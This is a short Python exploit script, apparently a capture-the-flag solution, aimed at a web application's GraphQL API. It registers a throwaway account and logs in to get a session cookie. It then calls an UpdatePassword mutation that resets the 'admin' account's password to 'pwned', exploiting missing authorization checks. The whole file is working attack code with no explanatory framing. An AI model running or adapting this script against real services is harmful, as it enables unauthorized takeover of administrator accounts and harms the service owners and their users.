import requests,sys,json
from pwn import info, args

if args.URL:
    target = "http://" + sys.argv[1]
else:
    info("Usage : " + sys.argv[0] + " URL IP:PORT")
    sys.exit()

def create_account(user, email, password):
     data = json.dumps({"query":"mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }","variables":{"email":f"{email}",f"username":f"{user}","password":f"{password}"}})
     res = requests.post(target + "/graphql", headers=headers, data=data)

def login_get_cookie(user,password):
    data = json.dumps({"query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":f"{user}","password":f"{password}"}})
    res = requests.post(target + "/graphql", headers=headers, data=data)
    b = json.loads(res.text)
    return b['data']['LoginUser']['token']

def update_admin_password():
    data = json.dumps({"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username": "admin","password":"pwned"}})
    request = requests.post(target + "/graphql", headers=headers,data=data, cookies=cookies)
    return request.text


if __name__ == "__main__":
    headers = {"Content-Type": "application/json"}

    user = "bruh"
    email = "bruh"
    password = "bruh"

    # Create an account
    create_account(user,email,password)

    # Get the cookie
    cookies = {"session" : login_get_cookie(user,password)}

    # Update admin account password to pwned
    update = update_admin_password()
    print(update)

